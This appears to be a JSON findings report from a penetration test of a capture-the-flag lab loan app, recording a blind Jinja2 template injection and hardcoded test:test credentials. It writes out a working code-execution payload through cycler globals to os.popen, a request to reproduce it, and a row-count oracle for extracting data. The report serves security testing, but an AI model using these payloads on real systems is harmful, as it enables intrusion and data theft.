@@ -1,0 +1,43 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:23:28.727026+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "7a23ab37-410a-4ff7-90c0-17b80e9fe08a",
+      "timestamp": "2026-04-13T11:23:28.726915+00:00",
+      "title": "Blind Server-Side Template Injection (SSTI) - RCE via Jinja2 range() parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40073/amortization?term=",
+      "description": "The `/amortization` endpoint accepts a `term` GET parameter that is embedded raw into a Jinja2 template string inside `range(TERM)` without sanitization. While `{`, `}`, `%` are filtered to prevent obvious Jinja2 syntax injection, the expression is evaluated directly as Python/Jinja2 code within the `for` loop's range() call. An attacker can access Flask's `cycler` Jinja2 global to reach `cycler.__init__.__globals__.os`, then call `os.popen()` to execute arbitrary OS commands. Since command output is not reflected in the HTTP response (blind SSTI), a character-by-character side-channel exfiltration technique using the amortization table row count as an oracle was used. Each character's ASCII value determines the number of rows rendered, allowing the full flag to be extracted in 42 requests.",
+      "evidence": "FLAG EXTRACTED: flag{90f2407f-0723-4fa1-a104-d5d8450bcded}\n\nProof of SSTI execution:\n- term=2*3 \u2192 6 rows (Jinja2 evaluates arithmetic)\n- term=cycler.__init__.__globals__.os.getpid() \u2192 10 rows (PID=10, OS access confirmed)\n- term=cycler.__init__.__globals__.os.popen('cat /flag').read()[0].encode()[0] \u2192 102 rows (= ASCII 'f')\n\nFull 42-char extraction:\nflag[0]=102='f', flag[1]=108='l', ..., flag[41]=125='}'\n\nCharacter-by-character oracle: range(char.encode()[0]) \u2192 row count leaks ASCII value.\n\nRCE Chain: cycler.__init__.__globals__.os.popen(cmd).read()",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /amortization?term=cycler.__init__.__globals__.os.popen('cat+/flag').read()[INDEX].encode()[0]",
+        "expected": "Row count = ASCII value of flag character at INDEX"
+      }
+    },
+    {
+      "id": "a78347a2-d7fe-4028-bf47-6b384dbe52a7",
+      "timestamp": "2026-04-13T11:23:33.490909+00:00",
+      "title": "Hardcoded Test Credentials in HTML Comment",
+      "severity": "medium",
+      "target": "http://172.17.0.1:40073/login",
+      "description": "The login page HTML source contains a comment revealing hardcoded test credentials: `<!-- TODO: Delete the testing account (test:test). -->`. These credentials provide full authenticated access to the application.",
+      "evidence": "<!-- TODO: Delete the testing account (test:test). --> found in /login page HTML source. Successfully authenticated with username=test password=test, gaining access to /home, /profile, /loan_details, /amortization endpoints.",
+      "tool_used": "manual",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "878f6aa0-f271-4e4f-8b21-482ce4726338",
+      "timestamp": "2026-04-13T11:23:41.553103+00:00",
+      "title": "Application Architecture and Attack Path",
+      "mermaid": "flowchart TD\n    Browser[\"Browser\"] --> Login[\"/login - Login Form\"]\n    Login -->|\"test:test from HTML comment\"| Auth[\"Flask Session JWT\"]\n    Auth --> Home[\"/home - Welcome Page\\n(renders name+lastname)\"]\n    Auth --> Profile[\"/profile - Update Profile\\n(name, lastname, email, loan fields)\"]\n    Auth --> Loans[\"/loan_details - Loan Details\\nShows amortization iframe\"]\n    Auth --> Amort[\"/amortization?term=EXPR\\nBlind SSTI Injection Point\"]\n    Amort -->|\"range(EXPR) evaluates in Jinja2\"| Jinja2[\"Jinja2 Template Engine\"]\n    Jinja2 -->|\"cycler.__init__.__globals__.os\"| OS[\"OS Module - RCE\"]\n    OS -->|\"popen('cat /flag')\"| Flag[\"/flag - CTF Flag\"]\n    Flag -->|\"char-by-char oracle via row count\"| Exfil[\"flag extractor\"]\n    Exfil --> Result[\"flag{90f2407f-0723-4fa1-a104-d5d8450bcded}\"]"
+    }
+  ]
+}
